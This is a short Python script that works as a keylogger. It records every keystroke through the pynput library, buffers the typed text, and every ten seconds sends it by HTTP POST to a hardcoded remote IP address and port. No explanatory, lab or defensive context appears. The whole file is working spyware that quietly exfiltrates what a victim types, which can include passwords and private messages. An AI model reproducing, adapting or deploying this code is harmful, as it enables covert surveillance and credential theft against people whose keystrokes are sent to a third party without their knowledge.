from pynput import keyboard
import requests
import json
import threading

text = ""  
new_text = ""  

ip_address = "3.92.210.215"
port_number = "1234"
time_interval = 10

def send_post_req():
    global new_text
    try:
        if new_text:  
            payload = json.dumps({"keyboardData": new_text})
            r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
            print("Sent:", new_text)
            new_text = "" 
        timer = threading.Timer(time_interval, send_post_req) 
        timer.start()
    except Exception as e:
        print("Couldn't complete request!", e)

def on_press(key):
    global text, new_text

    if key == keyboard.Key.enter:
        new_text += "\n"
    elif key == keyboard.Key.tab:
        new_text += "\t"
    elif key == keyboard.Key.space:
        new_text += " "
    elif key == keyboard.Key.shift:
        pass
    #elif key == keyboard.Key.backspace and len(new_text) == 0:
     #   pass
    elif key == keyboard.Key.backspace and len(new_text) > 0:
        new_text = new_text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        new_text += str(key).strip("'")

with keyboard.Listener(on_press=on_press) as listener:
    send_post_req() 
    listener.join()
